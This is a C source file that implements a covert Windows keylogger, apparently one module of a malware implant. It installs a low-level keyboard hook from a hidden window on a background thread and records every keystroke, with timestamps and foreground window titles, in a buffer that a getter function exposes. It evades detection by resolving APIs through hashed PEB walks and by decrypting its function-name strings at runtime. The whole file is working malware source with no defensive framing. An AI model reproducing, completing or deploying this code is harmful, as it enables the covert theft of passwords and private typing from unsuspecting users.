#include "keylogger.h"
#include "config.h"
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "enc_strings.h"
#include <windows.h>

#ifdef ENABLE_KEYLOGGER
#include <stdio.h>
#include <string.h>

/* ------------------------------------------------------------------ */
/* Constants                                                            */
/* ------------------------------------------------------------------ */

#define WH_KEYBOARD_LL 13
#define WM_KEYDOWN     0x0100
#define WM_SYSKEYDOWN  0x0104
#define WM_DESTROY     0x0002

#define VK_BACK    0x08
#define VK_TAB     0x09
#define VK_RETURN  0x0D
#define VK_SHIFT   0x10
#define VK_CONTROL 0x11
#define VK_MENU    0x12
#define VK_CAPITAL 0x14
#define VK_ESCAPE  0x1B
#define VK_SPACE   0x20
#define VK_DELETE  0x2E
#define VK_LWIN    0x5B
#define VK_RWIN    0x5C

/* ------------------------------------------------------------------ */
/* PEB-walk API resolution                                              */
/* ------------------------------------------------------------------ */

typedef HHOOK    (WINAPI *pSetWindowsHookExW)(int, HOOKPROC, HINSTANCE, DWORD);
typedef LRESULT  (WINAPI *pCallNextHookEx)(HHOOK, int, WPARAM, LPARAM);
typedef BOOL     (WINAPI *pUnhookWindowsHookEx)(HHOOK);
typedef SHORT    (WINAPI *pGetKeyState)(int);
typedef HWND     (WINAPI *pGetForegroundWindow)(void);
typedef int      (WINAPI *pGetWindowTextW)(HWND, wchar_t *, int);
typedef int      (WINAPI *pToUnicodeEx)(UINT, UINT, const BYTE *, wchar_t *, int, UINT, HKL);
typedef HMODULE  (WINAPI *pGetModuleHandleW)(const wchar_t *);
typedef BOOL     (WINAPI *pCloseHandle)(HANDLE);
typedef HANDLE   (WINAPI *pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD    (WINAPI *pWaitForSingleObject)(HANDLE, DWORD);
typedef VOID     (WINAPI *pSleep)(DWORD);
typedef void     (WINAPI *pInitializeCriticalSection)(LPCRITICAL_SECTION);
typedef void     (WINAPI *pDeleteCriticalSection)(LPCRITICAL_SECTION);
typedef void     (WINAPI *pEnterCriticalSection)(LPCRITICAL_SECTION);
typedef void     (WINAPI *pLeaveCriticalSection)(LPCRITICAL_SECTION);
typedef void     (WINAPI *pGetLocalTime)(LPSYSTEMTIME);
typedef HWND     (WINAPI *pCreateWindowExW)(DWORD, LPCWSTR, LPCWSTR, DWORD, int, int, int, int, HWND, HMENU, HINSTANCE, LPVOID);
typedef LRESULT  (WINAPI *pDefWindowProcW)(HWND, UINT, WPARAM, LPARAM);
typedef BOOL     (WINAPI *pDestroyWindow)(HWND);
typedef BOOL     (WINAPI *pDispatchMessageW)(const MSG *);
typedef BOOL     (WINAPI *pGetMessageW)(LPMSG, HWND, UINT, UINT);
typedef BOOL     (WINAPI *pPostMessageW)(HWND, UINT, WPARAM, LPARAM);
typedef void     (WINAPI *pPostQuitMessage)(int);
typedef ATOM     (WINAPI *pRegisterClassW)(const WNDCLASSW *);
typedef BOOL     (WINAPI *pTranslateMessage)(const MSG *);

static struct {
    pSetWindowsHookExW  pSWH;
    pCallNextHookEx     pCNH;
    pUnhookWindowsHookEx pUWH;
    pGetKeyState        pGKS;
    pGetForegroundWindow pGFW;
    pGetWindowTextW     pGWT;
    pToUnicodeEx        pTUE;
    pGetModuleHandleW   pGMH;
    pCloseHandle        pCH;
    pCreateThread       pCT;
    pWaitForSingleObject pWFSO;
    pSleep              pSl;
    int                 ready;
} kl_api;

static int kl_ensure_api(void) {
    if (kl_api.ready) return 1;
    char dll[32]; char fn[32];

    /* user32.dll APIs */
    enc_decrypt(enc_user32, ENC_USER32_LEN, dll);
    void *u32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!u32) return 0;

    enc_decrypt(enc_SetWindowsHookExW, ENC_SETWINDOWSHOOKEXW_LEN, fn);
    kl_api.pSWH = (pSetWindowsHookExW)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_CallNextHookEx, ENC_CALLNEXTHOOKEX_LEN, fn);
    kl_api.pCNH = (pCallNextHookEx)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_UnhookWindowsHookEx, ENC_UNHOOKWINDOWSHOOKEX_LEN, fn);
    kl_api.pUWH = (pUnhookWindowsHookEx)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_GetKeyState, ENC_GETKEYSTATE_LEN, fn);
    kl_api.pGKS = (pGetKeyState)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_GetForegroundWindow, ENC_GETFOREGROUNDWINDOW_LEN, fn);
    kl_api.pGFW = (pGetForegroundWindow)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_GetWindowTextW, ENC_GETWINDOWTEXTW_LEN, fn);
    kl_api.pGWT = (pGetWindowTextW)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_ToUnicodeEx, ENC_TOUNICODEEX_LEN, fn);
    kl_api.pTUE = (pToUnicodeEx)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));

    /* kernel32.dll — GetModuleHandleW */
    enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!k32) return 0;
    enc_decrypt(enc_GetModuleHandleW, ENC_GETMODULEHANDLEW_LEN, fn);
    kl_api.pGMH = (pGetModuleHandleW)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_CloseHandle, ENC_CLOSEHANDLE_LEN, fn);
    kl_api.pCH = (pCloseHandle)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_CreateThread, ENC_CREATETHREAD_LEN, fn);
    kl_api.pCT = (pCreateThread)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_WaitForSingleObject, ENC_WAITFORSINGLEOBJECT_LEN, fn);
    kl_api.pWFSO = (pWaitForSingleObject)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_Sleep, ENC_SLEEP_LEN, fn);
    kl_api.pSl = (pSleep)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));

    if (!kl_api.pSWH || !kl_api.pCNH || !kl_api.pUWH || !kl_api.pGKS ||
        !kl_api.pGFW || !kl_api.pGWT || !kl_api.pTUE || !kl_api.pGMH ||
        !kl_api.pCH || !kl_api.pCT || !kl_api.pWFSO || !kl_api.pSl)
        return 0;

    kl_api.ready = 1;
    return 1;
}

/* user32 window/message APIs */
static struct {
    pCreateWindowExW    pCWE;
    pDefWindowProcW     pDWP;
    pDestroyWindow      pDW;
    pDispatchMessageW   pDM;
    pGetMessageW        pGM;
    pPostMessageW       pPMsg;
    pPostQuitMessage    pPQM;
    pRegisterClassW     pRC;
    pTranslateMessage   pTM;
    int                 ready;
} g_kl_u32;

static int kl_ensure_u32(void) {
    if (g_kl_u32.ready) return 1;
    char dll[32]; char fn[32];
    enc_decrypt(enc_user32, ENC_USER32_LEN, dll);
    void *u32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!u32) return 0;
    enc_decrypt(enc_CreateWindowExW, ENC_CREATEWINDOWEXW_LEN, fn);
    g_kl_u32.pCWE = (pCreateWindowExW)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_DefWindowProcW, ENC_DEFWINDOWPROCW_LEN, fn);
    g_kl_u32.pDWP = (pDefWindowProcW)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_DestroyWindow, ENC_DESTROYWINDOW_LEN, fn);
    g_kl_u32.pDW = (pDestroyWindow)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_DispatchMessageW, ENC_DISPATCHMESSAGEW_LEN, fn);
    g_kl_u32.pDM = (pDispatchMessageW)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_GetMessageW, ENC_GETMESSAGEW_LEN, fn);
    g_kl_u32.pGM = (pGetMessageW)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_PostMessageW, ENC_POSTMESSAGEW_LEN, fn);
    g_kl_u32.pPMsg = (pPostMessageW)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_PostQuitMessage, ENC_POSTQUITMESSAGE_LEN, fn);
    g_kl_u32.pPQM = (pPostQuitMessage)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_RegisterClassW, ENC_REGISTERCLASSW_LEN, fn);
    g_kl_u32.pRC = (pRegisterClassW)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_TranslateMessage, ENC_TRANSLATEMESSAGE_LEN, fn);
    g_kl_u32.pTM = (pTranslateMessage)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));
    if (!g_kl_u32.pCWE || !g_kl_u32.pDWP || !g_kl_u32.pDW || !g_kl_u32.pDM ||
        !g_kl_u32.pGM || !g_kl_u32.pPMsg || !g_kl_u32.pPQM || !g_kl_u32.pRC || !g_kl_u32.pTM)
        return 0;
    g_kl_u32.ready = 1;
    return 1;
}

/* kernel32 CriticalSection + GetLocalTime */
static struct {
    pInitializeCriticalSection pICS;
    pDeleteCriticalSection     pDCS;
    pEnterCriticalSection      pECS;
    pLeaveCriticalSection      pLCS;
    pGetLocalTime              pGLT;
    int                        ready;
} g_kl_cs;

static int kl_ensure_cs(void) {
    if (g_kl_cs.ready) return 1;
    char dll[32]; char fn[32];
    enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!k32) return 0;
    enc_decrypt(enc_InitializeCriticalSection, ENC_INITIALIZECRITICALSECTION_LEN, fn);
    g_kl_cs.pICS = (pInitializeCriticalSection)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_DeleteCriticalSection, ENC_DELETECRITICALSECTION_LEN, fn);
    g_kl_cs.pDCS = (pDeleteCriticalSection)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_EnterCriticalSection, ENC_ENTERCRITICALSECTION_LEN, fn);
    g_kl_cs.pECS = (pEnterCriticalSection)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_LeaveCriticalSection, ENC_LEAVECRITICALSECTION_LEN, fn);
    g_kl_cs.pLCS = (pLeaveCriticalSection)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_GetLocalTime, ENC_GETLOCALTIME_LEN, fn);
    g_kl_cs.pGLT = (pGetLocalTime)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    if (!g_kl_cs.pICS || !g_kl_cs.pDCS || !g_kl_cs.pECS || !g_kl_cs.pLCS || !g_kl_cs.pGLT)
        return 0;
    g_kl_cs.ready = 1;
    return 1;
}

/* ------------------------------------------------------------------ */
/* Internal state                                                       */
/* ------------------------------------------------------------------ */

static char            g_buffer[KEYLOG_BUFFER_SIZE];
static volatile size_t g_head;   /* next write position */
static volatile size_t g_tail;   /* next read position  */
static CRITICAL_SECTION g_cs;

static HHOOK   g_hook   = NULL;
static HWND    g_hwnd   = NULL;
static HANDLE  g_thread = NULL;
static volatile BOOL g_running  = FALSE;
static volatile BOOL g_stop     = FALSE;
static HWND    g_last_hwnd = NULL;

/* Window class name for the hidden message window. */
static const wchar_t kClassName[] = { 'K','L','W','M',0 };

/* ------------------------------------------------------------------ */
/* Circular buffer helpers                                              */
/* ------------------------------------------------------------------ */

static void buf_write(const char *data, size_t len) {
    g_kl_cs.pECS(&g_cs);
    for (size_t i = 0; i < len; i++) {
        g_buffer[g_head] = data[i];
        g_head = (g_head + 1) % KEYLOG_BUFFER_SIZE;
        if (g_head == g_tail)
            g_tail = (g_tail + 1) % KEYLOG_BUFFER_SIZE;
    }
    g_kl_cs.pLCS(&g_cs);
}

static void buf_write_str(const char *s) {
    buf_write(s, strlen(s));
}

/* ------------------------------------------------------------------ */
/* Timestamp                                                            */
/* ------------------------------------------------------------------ */

static void write_timestamp(void) {
    SYSTEMTIME st;
    g_kl_cs.pGLT(&st);
    char ts[32];
    int n = snprintf(ts, sizeof(ts), "[%04d-%02d-%02d %02d:%02d:%02d] ",
                     st.wYear, st.wMonth, st.wDay,
                     st.wHour, st.wMinute, st.wSecond);
    if (n > 0)
        buf_write(ts, (size_t)n);
}

/* ------------------------------------------------------------------ */
/* Key state helpers                                                    */
/* ------------------------------------------------------------------ */

static BOOL is_shift_pressed(void) {
    return (kl_api.pGKS(VK_SHIFT) & 0x8000) != 0;
}

static BOOL is_caps_lock_on(void) {
    return (kl_api.pGKS(VK_CAPITAL) & 0x0001) != 0;
}

/* ------------------------------------------------------------------ */
/* Special key name                                                     */
/* ------------------------------------------------------------------ */

static const char *special_key_name(DWORD vk) {
    switch (vk) {
    case VK_BACK:    return "[BACK]";
    case VK_TAB:     return "[TAB]";
    case VK_RETURN:  return "[ENTER]";
    case VK_ESCAPE:  return "[ESC]";
    case VK_DELETE:  return "[DEL]";
    case 0x21:       return "[PGUP]";
    case 0x22:       return "[PGDN]";
    case 0x23:       return "[END]";
    case 0x24:       return "[HOME]";
    case 0x25:       return "[LEFT]";
    case 0x26:       return "[UP]";
    case 0x27:       return "[RIGHT]";
    case 0x28:       return "[DOWN]";
    case 0x2C:       return "[PRTSC]";
    case 0x2D:       return "[INS]";
    /* F1 – F12 */
    case 0x70: return "[F1]";
    case 0x71: return "[F2]";
    case 0x72: return "[F3]";
    case 0x73: return "[F4]";
    case 0x74: return "[F5]";
    case 0x75: return "[F6]";
    case 0x76: return "[F7]";
    case 0x77: return "[F8]";
    case 0x78: return "[F9]";
    case 0x79: return "[F10]";
    case 0x7A: return "[F11]";
    case 0x7B: return "[F12]";
    /* Modifier keys — skip silently */
    case VK_SHIFT:
    case VK_CONTROL:
    case VK_MENU:
    case VK_CAPITAL:
    case VK_LWIN:
    case VK_RWIN:
        return NULL;
    default:
        return NULL;
    }
}

/* ------------------------------------------------------------------ */
/* Unicode key translation via ToUnicodeEx                               */
/* ------------------------------------------------------------------ */

static int translate_unicode(UINT vk, UINT scan, BYTE *key_state, wchar_t *out, int out_max) {
    /* Build a 256-byte keyboard state array. */
    BYTE kbd[256];
    memset(kbd, 0, sizeof(kbd));

    if (is_shift_pressed())  kbd[VK_SHIFT]   = 0x80;
    if (is_caps_lock_on())   kbd[VK_CAPITAL] = 0x01;
    /* Also mirror actual key state for modifiers. */
    if (kl_api.pGKS(VK_CONTROL) & 0x8000) kbd[VK_CONTROL] = 0x80;
    if (kl_api.pGKS(VK_MENU)    & 0x8000) kbd[VK_MENU]    = 0x80;

    (void)key_state;

    return kl_api.pTUE(vk, scan, kbd, out, out_max, 0, NULL);
}

/* ------------------------------------------------------------------ */
/* Foreground window tracking                                           */
/* ------------------------------------------------------------------ */

static void track_foreground_window(void) {
    HWND fg = kl_api.pGFW();
    if (!fg || fg == g_last_hwnd)
        return;
    g_last_hwnd = fg;

    wchar_t title[256];
    int len = kl_api.pGWT(fg, title, 256);
    if (len <= 0) {
        buf_write_str("[Window: (unknown)]\n");
        return;
    }

    /* Encode timestamp + window title into the log. */
    write_timestamp();
    buf_write_str("[Window: ");

    /* Convert UTF-16 to UTF-8 for the log buffer. */
    for (int i = 0; i < len && i < 256; i++) {
        wchar_t ch = title[i];
        if (ch < 0x80) {
            char c = (char)(ch & 0x7F);
            buf_write(&c, 1);
        } else if (ch < 0x800) {
            char c[2];
            c[0] = (char)(0xC0 | (ch >> 6));
            c[1] = (char)(0x80 | (ch & 0x3F));
            buf_write(c, 2);
        } else {
            char c[3];
            c[0] = (char)(0xE0 | (ch >> 12));
            c[1] = (char)(0x80 | ((ch >> 6) & 0x3F));
            c[2] = (char)(0x80 | (ch & 0x3F));
            buf_write(c, 3);
        }
    }
    buf_write_str("]\n");
}

/* ------------------------------------------------------------------ */
/* Hook procedure                                                       */
/* ------------------------------------------------------------------ */

static LRESULT CALLBACK hook_proc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (g_stop)
        return 0;

    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lParam;
        DWORD vk  = kb->vkCode;
        DWORD scan = kb->scanCode;

        track_foreground_window();

        /* Try Unicode translation first (handles international layouts). */
        wchar_t wbuf[8];
        int wlen = translate_unicode((UINT)vk, (UINT)scan, NULL, wbuf, 8);
        if (wlen == 1 && wbuf[0] >= 0x20 && wbuf[0] < 0x7F) {
            char c = (char)wbuf[0];
            write_timestamp();
            buf_write(&c, 1);
        } else if (wlen == 1 && wbuf[0] >= 0x80) {
            /* Non-ASCII Unicode character — encode as UTF-8. */
            wchar_t ch = wbuf[0];
            char utf8[4];
            int n = 0;
            if (ch < 0x800) {
                utf8[0] = (char)(0xC0 | (ch >> 6));
                utf8[1] = (char)(0x80 | (ch & 0x3F));
                n = 2;
            } else {
                utf8[0] = (char)(0xE0 | (ch >> 12));
                utf8[1] = (char)(0x80 | ((ch >> 6) & 0x3F));
                utf8[2] = (char)(0x80 | (ch & 0x3F));
                n = 3;
            }
            write_timestamp();
            buf_write(utf8, (size_t)n);
        } else {
            /* Fallback: check for special keys. */
            const char *name = special_key_name(vk);
            if (name) {
                write_timestamp();
                buf_write_str(name);
                buf_write_str(" ");
            }
        }
    }

    return kl_api.pCNH(g_hook, nCode, wParam, lParam);
}

/* ------------------------------------------------------------------ */
/* Hidden window proc                                                   */
/* ------------------------------------------------------------------ */

static LRESULT CALLBACK wnd_proc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (msg == WM_DESTROY) {
        g_kl_u32.pPQM(0);
        return 0;
    }
    return g_kl_u32.pDWP(hwnd, msg, wParam, lParam);
}

/* ------------------------------------------------------------------ */
/* Background thread entry point                                        */
/* ------------------------------------------------------------------ */

static DWORD WINAPI keylogger_thread(LPVOID param) {
    (void)param;

    if (!kl_ensure_api() || !kl_ensure_u32() || !kl_ensure_cs()) return 1;

    HINSTANCE hInst = kl_api.pGMH(NULL);

    /* Register a minimal window class. */
    WNDCLASSW wc = {0};
    wc.lpfnWndProc   = wnd_proc;
    wc.hInstance      = hInst;
    wc.lpszClassName  = kClassName;
    if (!g_kl_u32.pRC(&wc))
        return 1;

    g_hwnd = g_kl_u32.pCWE(0, kClassName, kClassName,
                             0, 0, 0, 0, 0,
                             NULL, NULL, hInst, NULL);
    if (!g_hwnd)
        return 1;

    /* Install low-level keyboard hook. */
    g_hook = kl_api.pSWH(WH_KEYBOARD_LL, hook_proc, hInst, 0);
    if (!g_hook) {
        g_kl_u32.pDW(g_hwnd);
        g_hwnd = NULL;
        return 1;
    }

    g_running = TRUE;

    /* Message pump — required for the hook to fire. */
    MSG msg;
    while (g_kl_u32.pGM(&msg, NULL, 0, 0) > 0) {
        g_kl_u32.pTM(&msg);
        g_kl_u32.pDM(&msg);
    }

    /* Cleanup. */
    kl_api.pUWH(g_hook);
    g_hook = NULL;
    g_kl_u32.pDW(g_hwnd);
    g_hwnd = NULL;
    g_running = FALSE;
    return 0;
}

/* ------------------------------------------------------------------ */
/* Public API                                                           */
/* ------------------------------------------------------------------ */

int keylogger_start(void) {
    if (g_running)
        return 0;
    if (!kl_ensure_cs()) return -1;

    g_kl_cs.pICS(&g_cs);
    g_kl_cs.pECS(&g_cs);
    g_head = 0;
    g_tail = 0;
    g_stop = FALSE;
    g_last_hwnd = NULL;
    g_kl_cs.pLCS(&g_cs);

    g_thread = kl_api.pCT(NULL, 0, keylogger_thread, NULL, 0, NULL);
    if (!g_thread)
        return -1;

    /* Wait briefly for the hook to be installed. */
    for (int i = 0; i < 50 && !g_running; i++)
        kl_api.pSl(10);

    return g_running ? 0 : -1;
}

void keylogger_stop(void) {
    if (!g_running)
        return;

    g_stop = TRUE;

    /* Posting WM_DESTROY to the hidden window forces GetMessage to return. */
    if (g_hwnd)
        g_kl_u32.pPMsg(g_hwnd, WM_DESTROY, 0, 0);

    if (g_thread) {
        kl_api.pWFSO(g_thread, 3000);
        kl_api.pCH(g_thread);
        g_thread = NULL;
    }

    g_kl_cs.pDCS(&g_cs);
}

size_t keylogger_get_log(char *buf, size_t buf_len) {
    if (!buf || buf_len == 0)
        return 0;

    g_kl_cs.pECS(&g_cs);

    size_t h = g_head;
    size_t t = g_tail;

    size_t avail = 0;
    if (h >= t)
        avail = h - t;
    else
        avail = (KEYLOG_BUFFER_SIZE - t) + h;

    size_t to_copy = (avail < buf_len) ? avail : buf_len;
    size_t pos = 0;
    while (pos < to_copy) {
        buf[pos] = g_buffer[t];
        t = (t + 1) % KEYLOG_BUFFER_SIZE;
        pos++;
    }
    buf[to_copy < buf_len ? to_copy : buf_len - 1] = '\0';

    g_tail = t;

    g_kl_cs.pLCS(&g_cs);
    return to_copy;
}

#endif /* ENABLE_KEYLOGGER */
